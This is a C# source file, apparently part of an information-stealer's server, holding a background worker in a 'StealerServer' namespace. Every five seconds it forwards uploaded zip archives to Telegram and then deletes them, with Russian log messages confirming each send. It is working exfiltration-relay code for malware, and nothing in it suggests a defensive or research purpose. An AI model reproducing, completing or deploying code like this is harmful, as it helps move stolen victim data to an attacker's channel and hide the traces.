using StealerServer.Service;

namespace StealerServer.BackgroundWorkers;
public class TelegramWorker : BackgroundService
{
    private readonly TelegramService _telegramService;
    private readonly string _storagePath = Path.Combine(Directory.GetCurrentDirectory(), "UploadedArchives");

    public TelegramWorker(TelegramService telegramService)
    {
        _telegramService = telegramService;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        while (!stoppingToken.IsCancellationRequested)
        {
            try
            {
                if (Directory.Exists(_storagePath))
                {
                    var files = Directory.GetFiles(_storagePath, "*.zip");

                    foreach (var filePath in files)
                    {
                        bool isSent = await _telegramService.SendDocumentAsync(filePath);

                        if (isSent)
                        {
                            File.Delete(filePath);
                            Console.WriteLine($"[Worker] Файл {Path.GetFileName(filePath)} успешно отправлен и удален с сервера.");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Worker Error]: {ex.Message}");
            }

            await Task.Delay(TimeSpan.FromSeconds(5), stoppingToken);
        }
    }

}
